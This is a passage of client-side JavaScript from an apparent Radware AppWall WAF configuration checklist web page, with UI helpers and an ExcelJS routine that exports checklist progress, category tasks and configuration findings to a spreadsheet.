    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.subtitle : '';
}

// Initialize category data if needed
function initializeCategoryData(categoryId) {
    // This function would populate any missing data for the category
    // such as techniques, tools, etc. before rendering
    // In a complete implementation, it might load data from a central repository
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    
    try {
        const date = new Date(dateString);
        return date.toLocaleDateString();
    } catch (e) {
        return dateString;
    }
}

function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

function getPriorityClass(priority) {
    switch (priority) {
        case 'critical':
            return {
                bgClass: 'bg-status-critical/10',
                textClass: 'text-status-critical',
                bgSolid: 'bg-status-critical'
            };
        case 'high':
            return {
                bgClass: 'bg-status-high/10',
                textClass: 'text-status-high',
                bgSolid: 'bg-status-high'
            };
        case 'medium':
            return {
                bgClass: 'bg-status-medium/10',
                textClass: 'text-status-medium',
                bgSolid: 'bg-status-medium'
            };
        default:
            return {
                bgClass: 'bg-radware-primary/10',
                textClass: 'text-radware-primary',
                bgSolid: 'bg-radware-primary'
            };
    }
}

function getPriorityIndicator(priority) {
    switch (priority) {
        case 'critical':
            return 'bg-status-critical';
        case 'high':
            return 'bg-status-high';
        case 'medium':
            return 'bg-status-medium';
        case 'low':
            return 'bg-status-low';
        default:
            return '';
    }
}

function getSeverityClasses(severity) {
    switch (severity) {
        case 'high':
            return {
                bgClass: 'bg-status-critical/10',
                textClass: 'text-status-critical'
            };
        case 'medium':
            return {
                bgClass: 'bg-status-high/10',
                textClass: 'text-status-high'
            };
        case 'low':
            return {
                bgClass: 'bg-status-medium/10',
                textClass: 'text-status-medium'
            };
        case 'info':
            return {
                bgClass: 'bg-radware-primary/10',
                textClass: 'text-radware-primary'
            };
        default:
            return {
                bgClass: 'bg-gray-100',
                textClass: 'text-gray-700'
            };
    }
}

function formatConfigCommands(configText) {
    if (!configText) return '';
    
    // Split the config text into lines
    const lines = configText.split('\n');
    
    // Process each line to add proper HTML formatting
    return lines.map(line => {
        if (line.trim().startsWith('#')) {
            // Comment line
            return `<div class="code-comment">${escapeHtml(line)}</div>`;
        } else {
            // Command line - identify the command part and parameters
            const parts = line.split(' ');
            if (parts.length < 2) return `<div>${escapeHtml(line)}</div>`;
            
            const command = parts[0];
            const rest = parts.slice(1).join(' ');
            
            return `<div><span class="code-command">${escapeHtml(command)}</span> ${escapeHtml(rest)}</div>`;
        }
    }).join('');
}

function escapeHtml(text) {
    // Basic HTML escaping for security
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

function showToast(message, type = 'success') {
    const container = document.getElementById('toast-container');
    if (!container) return;
    
    const toast = document.createElement('div');
    toast.className = `rounded-lg p-4 mb-3 flex items-center shadow-lg transform transition-all duration-300 translate-x-full opacity-0`;
    
    // Set background color based on type
    if (type === 'success') {
        toast.classList.add('bg-green-500', 'text-white');
    } else if (type === 'error') {
        toast.classList.add('bg-red-500', 'text-white');
    } else if (type === 'warning') {
        toast.classList.add('bg-yellow-500', 'text-white');
    } else {
        toast.classList.add('bg-blue-500', 'text-white');
    }
    
    // Icon based on type
    let icon = 'fa-check-circle';
    if (type === 'error') icon = 'fa-times-circle';
    else if (type === 'warning') icon = 'fa-exclamation-circle';
    else if (type === 'info') icon = 'fa-info-circle';
    
    toast.innerHTML = `
        <i class="fas ${icon} mr-3 text-lg"></i>
        <span>${message}</span>
    `;
    
    container.appendChild(toast);
    
    // Animate in
    setTimeout(() => {
        toast.classList.remove('translate-x-full', 'opacity-0');
    }, 10);
    
    // Animate out after timeout
    setTimeout(() => {
        toast.classList.add('translate-x-full', 'opacity-0');
        setTimeout(() => {
            container.removeChild(toast);
        }, 300);
    }, 3000);
}












    </script>













<script src="https://cdn.jsdelivr.net/npm/exceljs@4.3.0/dist/exceljs.min.js"></script>
<script>
// Initialize Excel Report Generator
document.addEventListener('DOMContentLoaded', function() {
    // Add floating Excel export button
    addExcelExportButton();
    
    // Setup event listeners
    setupExcelExportListeners();
});

// Function to add floating Excel export button
function addExcelExportButton() {
    const button = document.createElement('button');
    button.id = 'excel-export-btn';
    button.className = 'fixed bottom-6 right-6 z-40 bg-green-600 hover:bg-green-700 text-white rounded-full w-14 h-14 flex items-center justify-center shadow-lg transition-all transform hover:scale-110';
    button.innerHTML = '<i class="fas fa-file-excel text-xl"></i>';
    button.setAttribute('title', 'Export to Excel');
    
    document.body.appendChild(button);
    
    // Add CSS for button hover effect
    const style = document.createElement('style');
    style.textContent = `
        #excel-export-btn:hover {
            box-shadow: 0 0 15px rgba(72, 187, 120, 0.5);
        }
        .excel-export-tooltip {
            position: absolute;
            background-color: #1a202c;
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 0.375rem;
            font-size: 0.875rem;
            white-space: nowrap;
            right: 4rem;
            bottom: 1.25rem;
            opacity: 0;
            transform: translateX(10px);
            transition: all 0.3s ease;
        }
        #excel-export-btn:hover .excel-export-tooltip {
            opacity: 1;
            transform: translateX(0);
        }
    `;
    document.head.appendChild(style);
    
    // Add tooltip
    const tooltip = document.createElement('span');
    tooltip.className = 'excel-export-tooltip';
    tooltip.textContent = 'Export to Excel';
    button.appendChild(tooltip);
}

// Setup event listeners for Excel export
function setupExcelExportListeners() {
    document.getElementById('excel-export-btn').addEventListener('click', function() {
        generateExcelReport();
    });
}

// Generate Excel report with all checklist data
async function generateExcelReport() {
    try {
        // Show loading indicator
        showLoadingIndicator();
        
        // Create a new workbook
        const workbook = new ExcelJS.Workbook();
        
        // Set workbook properties
        workbook.creator = 'Radware AppWall Checklist Tool';
        workbook.lastModifiedBy = 'Radware AppWall Checklist Tool';
        workbook.created = new Date();
        workbook.modified = new Date();
        
        // Add overview worksheet
        await createOverviewWorksheet(workbook);
        
        // Add category worksheets
        for (const category of appwallData.categories) {
            await createCategoryWorksheet(workbook, category);
        }
        
        // Add findings worksheet
        await createFindingsWorksheet(workbook);
        
        // Generate and save the Excel file
        const buffer = await workbook.xlsx.writeBuffer();
        saveExcelFile(buffer);
        
        // Hide loading indicator and show success message
        hideLoadingIndicator();
        showToast('Excel report generated successfully', 'success');
    } catch (error) {
        console.error('Error generating Excel report:', error);
        hideLoadingIndicator();
        showToast('Failed to generate Excel report: ' + error.message, 'error');
    }
}

// Create overview worksheet
async function createOverviewWorksheet(workbook) {
    // Add a worksheet
    const worksheet = workbook.addWorksheet('Overview');
    
    // Set default column width
    worksheet.properties.defaultColWidth = 25;
    
    // Add title
    const titleRow = worksheet.addRow(['Radware AppWall WAF Configuration Checklist']);
    titleRow.font = { bold: true, size: 16 };
    titleRow.height = 30;
    worksheet.mergeCells('A1:G1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Add empty row
    worksheet.addRow([]);
    
    // Add project info
    if (currentProject) {
        addProjectInfoToWorksheet(worksheet);
    }
    
    // Add empty rows
    worksheet.addRow([]);
    worksheet.addRow([]);
    
    // Add progress headers
    const headerRow = worksheet.addRow([
        'Category',
        'Priority',
        'Progress',
        'Critical Items',
        'High Items',
        'Medium Items',
        'Total Items'
    ]);
    
    // Style header row
    headerRow.eachCell((cell) => {
        cell.font = { bold: true };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: '4F81BD' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
    });
    
    // Add progress data for each category
    let overallComplete = 0;
    let overallTotal = 0;
    
    appwallData.categories.forEach(category => {
        // Count tasks by priority
        let critical = 0;
        let high = 0;
        let medium = 0;
        let total = 0;
        let completed = 0;
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                total++;
                
                if (item.priority === 'critical') critical++;
                else if (item.priority === 'high') high++;
                else if (item.priority === 'medium') medium++;
                
                // Check if task is completed
                if (currentProject && 
                    currentProject.taskStatus && 
                    currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                    completed++;
                }
            });
        });
        
        overallComplete += completed;
        overallTotal += total;
        
        const progressPercent = Math.round((completed / total) * 100);
        
        // Add category data row
        const dataRow = worksheet.addRow([
            category.title,
            capitalizeFirstLetter(category.priority),
            progressPercent + '%',
            critical,
            high,
            medium,
            total
        ]);
        
        // Style the row
        dataRow.eachCell((cell, colNumber) => {
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            
            // Progress column styling
            if (colNumber === 3) {
                // Set cell color based on progress
                if (progressPercent < 30) {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFC7CE' } // Light red
                    };
                } else if (progressPercent < 70) {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFEB9C' } // Light yellow
                    };
                } else {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'C6EFCE' } // Light green
                    };
                }
                
                cell.alignment = { horizontal: 'center' };
            }
            
            // Priority column styling
            if (colNumber === 2) {
                if (category.priority === 'critical') {
                    cell.font = { color: { argb: 'FF0000' } }; // Red
                } else if (category.priority === 'high') {
                    cell.font = { color: { argb: 'FF6600' } }; // Orange
                } else if (category.priority === 'medium') {
                    cell.font = { color: { argb: 'FFCC00' } }; // Yellow
                }
                
                cell.alignment = { horizontal: 'center' };
            }
            
            // Center numbers
            if (colNumber >= 3) {
                cell.alignment = { horizontal: 'center' };
            }
        });
    });
    
    // Add empty row
    worksheet.addRow([]);
    
    // Add overall progress row
    const overallPercent = Math.round((overallComplete / overallTotal) * 100);
    const overallRow = worksheet.addRow([
        'Overall Progress:',
        '',
        overallPercent + '%',
        '',
        '',
        '',
        overallTotal
    ]);
    
    // Style overall row
    overallRow.eachCell((cell, colNumber) => {
        cell.font = { bold: true };
        
        if (colNumber === 1) {
            cell.alignment = { horizontal: 'right' };
        }
        
        if (colNumber === 3) {
            // Set cell color based on progress
            if (overallPercent < 30) {
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'FFC7CE' } // Light red
                };
            } else if (overallPercent < 70) {
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'FFEB9C' } // Light yellow
                };
            } else {
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'C6EFCE' } // Light green
                };
            }
            
            cell.alignment = { horizontal: 'center' };
        }
        
        if (colNumber === 7) {
            cell.alignment = { horizontal: 'center' };
        }
    });
    
    // Set column widths
    worksheet.getColumn(1).width = 40; // Category
    worksheet.getColumn(2).width = 15; // Priority
    worksheet.getColumn(3).width = 15; // Progress
    worksheet.getColumn(4).width = 15; // Critical
    worksheet.getColumn(5).width = 15; // High
    worksheet.getColumn(6).width = 15; // Medium
    worksheet.getColumn(7).width = 15; // Total
}

// Add project info to the worksheet
function addProjectInfoToWorksheet(worksheet) {
    const project = currentProject;
    
    const infoData = [
        ['Project Name:', project.name || 'Unnamed Project'],
        ['Target:', project.target || 'N/A'],
        ['Date:', formatDate(project.date)],
        ['Security Engineer:', project.tester || 'N/A'],
        ['Last Updated:', formatDate(project.lastUpdated)],
        ['Scope:', project.scope || 'N/A']
    ];
    
    infoData.forEach(rowData => {
        const row = worksheet.addRow(rowData);
        row.getCell(1).font = { bold: true };
    });
}

// Create category worksheet
async function createCategoryWorksheet(workbook, category) {
    // Add a worksheet with category title (max 31 chars for Excel)
    const sheetName = category.title.replace(/[\\/*?:\\[\\]]/g, '').substring(0, 31);
    const worksheet = workbook.addWorksheet(sheetName);
    
    // Set default column width
    worksheet.properties.defaultColWidth = 20;
    
    // Add title
    const titleRow = worksheet.addRow([category.title]);
    titleRow.font = { bold: true, size: 16 };
    titleRow.height = 30;
    worksheet.mergeCells('A1:E1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Add subtitle
    const subtitleRow = worksheet.addRow([category.subtitle]);
    subtitleRow.font = { italic: true };
    worksheet.mergeCells('A2:E2');
    subtitleRow.alignment = { horizontal: 'center' };
    
    // Add empty row
    worksheet.addRow([]);
    
    // Iterate through checklist groups
    category.checklist.forEach((group, groupIndex) => {
        // Add group title
        const groupRow = worksheet.addRow([group.title]);
        groupRow.font = { bold: true, size: 14 };
        worksheet.mergeCells(`A${groupRow.number}:E${groupRow.number}`);
        groupRow.getCell(1).fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: 'DCE6F1' } // Light blue
        };
        groupRow.height = 24;
        
        // Add headers
        const headerRow = worksheet.addRow([
            'Item ID',
            'Task',
            'Priority',
            'Status',
            'Notes'
        ]);
        
        // Style header row
        headerRow.eachCell((cell) => {
            cell.font = { bold: true };
            cell.fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: '95B3D7' }
            };
            cell.alignment = { horizontal: 'center', vertical: 'middle' };
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
        });
        
        // Add task items
        group.items.forEach(item => {
            // Get task status
            let status = "Not Started";
            if (currentProject && currentProject.taskStatus) {
                if (currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                    status = "Completed";
                } else if (currentProject.taskStatus[item.id] === TASK_STATUS.NA) {
                    status = "Not Applicable";
                }
            }
            
            // Get notes for this task (if available)
            let notes = "";
            if (currentProject && 
                currentProject.notes && 
                currentProject.notes[category.id] &&
                currentProject.notes[category.id].includes(item.id)) {
                // In a real app, you'd have more granular note storage
                notes = "See category notes";
            }
            
            // Add task row
            const taskRow = worksheet.addRow([
                item.id,
                item.text,
                capitalizeFirstLetter(item.priority),
                status,
                notes
            ]);
            
            // Style task row
            taskRow.eachCell((cell, colNumber) => {
                cell.border = {
                    top: { style: 'thin' },
                    left: { style: 'thin' },
                    bottom: { style: 'thin' },
                    right: { style: 'thin' }
                };
                
                // Priority column
                if (colNumber === 3) {
                    cell.alignment = { horizontal: 'center' };
                    
                    if (item.priority === 'critical') {
                        cell.font = { color: { argb: 'FF0000' } }; // Red
                    } else if (item.priority === 'high') {
                        cell.font = { color: { argb: 'FF6600' } }; // Orange
                    } else if (item.priority === 'medium') {
                        cell.font = { color: { argb: 'FFCC00' } }; // Yellow
                    }
                }
                
                // Status column
                if (colNumber === 4) {
                    cell.alignment = { horizontal: 'center' };
                    
                    if (status === "Completed") {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'C6EFCE' } // Light green
                        };
                    } else if (status === "Not Applicable") {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'DDDDDD' } // Light gray
                        };
                    } else {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'FFC7CE' } // Light red
                        };
                    }
                }
            });
        });
        
        // Add empty row after group
        worksheet.addRow([]);
    });
    
    // Category notes
    const notesHeaderRow = worksheet.addRow(['Category Notes:']);
    notesHeaderRow.font = { bold: true };
    worksheet.mergeCells(`A${notesHeaderRow.number}:E${notesHeaderRow.number}`);
    
    if (currentProject && 
        currentProject.notes && 
        currentProject.notes[category.id]) {
        
        const notesRow = worksheet.addRow([currentProject.notes[category.id]]);
        worksheet.mergeCells(`A${notesRow.number}:E${notesRow.number}`);
        notesRow.alignment = { wrapText: true };
        notesRow.height = 80; // Taller row for notes
    } else {
        const notesRow = worksheet.addRow(['No notes available']);
        worksheet.mergeCells(`A${notesRow.number}:E${notesRow.number}`);
        notesRow.font = { italic: true };
    }
    
    // Set column widths
    worksheet.getColumn(1).width = 15;  // ID
    worksheet.getColumn(2).width = 60;  // Task
    worksheet.getColumn(3).width = 15;  // Priority
    worksheet.getColumn(4).width = 15;  // Status
    worksheet.getColumn(5).width = 30;  // Notes
}

// Create findings worksheet
async function createFindingsWorksheet(workbook) {
    // Add a worksheet
    const worksheet = workbook.addWorksheet('Findings');
    
    // Add title
    const titleRow = worksheet.addRow(['Configuration Issues']);
    titleRow.font = { bold: true, size: 16 };
    titleRow.height = 30;
    worksheet.mergeCells('A1:F1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Add empty row
    worksheet.addRow([]);
    
    // Add headers
    const headerRow = worksheet.addRow([
        'ID',
        'Category',
        'Title',
        'Severity',
        'Description',
        'Remediation'
    ]);
    
    // Style header row
    headerRow.eachCell((cell) => {
        cell.font = { bold: true };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: '4F81BD' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
    });
    
    // Add findings
    if (appwallData.findings && appwallData.findings.length > 0) {
        appwallData.findings.forEach(finding => {
            const findingRow = worksheet.addRow([
                finding.id,
                getCategoryTitle(finding.category),
                finding.title,
                capitalizeFirstLetter(finding.severity),
                finding.description,
                finding.remediation
            ]);
            
            // Style finding row
            findingRow.eachCell((cell, colNumber) => {
                cell.border = {
                    top: { style: 'thin' },
                    left: { style: 'thin' },
                    bottom: { style: 'thin' },
                    right: { style: 'thin' }
                };
                cell.alignment = { wrapText: true, vertical: 'top' };
                
                // Severity column
                if (colNumber === 4) {
                    cell.alignment = { horizontal: 'center', vertical: 'middle' };
                    
                    if (finding.severity === 'high') {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'FFC7CE' } // Light red
                        };
                        cell.font = { color: { argb: '9C0006' } };
                    } else if (finding.severity === 'medium') {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'FFEB9C' } // Light yellow
                        };
                        cell.font = { color: { argb: '9C6500' } };
                    } else if (finding.severity === 'low') {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'C6EFCE' } // Light green
                        };
                        cell.font = { color: { argb: '006100' } };
                    }
                }
            });
            
            // Set row height for description and remediation
            findingRow.height = 60;
        });
    } else {
        const noFindingRow = worksheet.addRow([
            '',
            '',
            'No configuration issues documented',
            '',
            '',
            ''
        ]);
        worksheet.mergeCells(`C${noFindingRow.number}:D${noFindingRow.number}`);
        noFindingRow.getCell(3).alignment = { horizontal: 'center' };
        noFindingRow.getCell(3).font = { italic: true };
    }
    
    // Set column widths
    worksheet.getColumn(1).width = 15;  // ID
    worksheet.getColumn(2).width = 25;  // Category
    worksheet.getColumn(3).width = 40;  // Title
    worksheet.getColumn(4).width = 15;  // Severity
    worksheet.getColumn(5).width = 60;  // Description
    worksheet.getColumn(6).width = 60;  // Remediation
}

// Save Excel file
function saveExcelFile(buffer) {
    const blob = new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' });
    const fileName = "Radware_AppWall_Checklist_" + formatDateForFileName(new Date()) + ".xlsx";
    
    // Create download link
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    
    // Clean up
    setTimeout(function() {
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    }, 0);
}

// Format date for file name
function formatDateForFileName(date) {
    const yyyy = date.getFullYear();
    const mm = String(date.getMonth() + 1).padStart(2, '0');
    const dd = String(date.getDate()).padStart(2, '0');
    return `${yyyy}-${mm}-${dd}`;
}

// Helper function: Get category title from ID
function getCategoryTitle(categoryId) {
    const category = appwallData.categories.find(c => c.id === categoryId);
    return category ? category.title : 'Unknown Category';
}

// Show loading indicator
function showLoadingIndicator() {
    // Create loading overlay if not exists
    if (!document.getElementById('excel-loading-overlay')) {
        const overlay = document.createElement('div');
        overlay.id = 'excel-loading-overlay';
        overlay.className = 'fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center';
        overlay.innerHTML = `
            <div class="bg-white rounded-lg p-8 shadow-2xl flex flex-col items-center">
                <div class="w-16 h-16 border-4 border-t-radware-primary border-b-radware-primary border-r-transparent border-l-transparent rounded-full animate-spin mb-4"></div>
                <h3 class="text-xl font-bold text-gray-800">Generating Excel Report</h3>
                <p class="text-gray-600 mt-2">Please wait while we prepare your report...</p>
            </div>
        `;
        document.body.appendChild(overlay);
    } else {
        document.getElementById('excel-loading-overlay').classList.remove('hidden');
    }
}

// Hide loading indicator
function hideLoadingIndicator() {
    const overlay = document.getElementById('excel-loading-overlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

// Helper function: used by the Excel generator
function formatDate(dateString) {
    if (!dateString) return 'N/A';
    
    try {
        const date = new Date(dateString);
        return date.toLocaleDateString();
    } catch (e) {
        return dateString;
    }
}
</script>








</body>
</html>
